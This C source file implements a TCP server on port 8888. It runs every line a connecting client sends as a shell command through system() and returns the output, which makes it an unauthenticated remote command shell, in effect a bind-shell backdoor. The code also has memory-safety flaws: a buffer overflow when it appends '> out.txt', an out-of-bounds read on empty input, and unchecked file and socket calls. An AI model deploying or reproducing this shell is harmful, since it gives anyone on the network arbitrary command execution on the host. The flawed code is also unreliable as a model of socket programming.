#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <malloc.h>
#include <stdlib.h>

typedef struct sockaddr SOCKADDR;
typedef struct sockaddr_in SOCKADDR_IN;
int main()
{
    int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    SOCKADDR_IN saddr, caddr;
    int clen = sizeof(caddr);
    saddr.sin_family = AF_INET;
    saddr.sin_port = htons(8888);
    saddr.sin_addr.s_addr = 0;
    if (bind(s, (SOCKADDR*)&saddr, sizeof(saddr)) == 0)
    {
        listen(s, 10);
        int c = accept(s, (SOCKADDR*)&caddr, (socklen_t*)&clen);
        char buffer[1024];
        while (0 == 0)
        {
            memset(buffer, 0, sizeof(buffer));
            recv(c, buffer, sizeof(buffer) - 1, 0);
            if (buffer[strlen(buffer) - 1] == '\n' || buffer[strlen(buffer) - 1] == '\r')
            {
                buffer[strlen(buffer) - 1] = 0;
            }
            //system("ifconfig > out.txt")        
            sprintf(buffer + strlen(buffer), "> out.txt");
            system(buffer);
            FILE* f = fopen("out.txt","rb");
            fseek(f, 0, SEEK_END);
            int count = ftell(f);
            fseek(f, 0, SEEK_SET);
            char* data = (char*)calloc(count, 1);
            fread(data, 1, count, f);
            send(c, data, count, 0);
            free(data);
            data = NULL;
            fclose(f);
        }
    }else{
        close(s);
        printf("Failed to bind\n");        
    }
}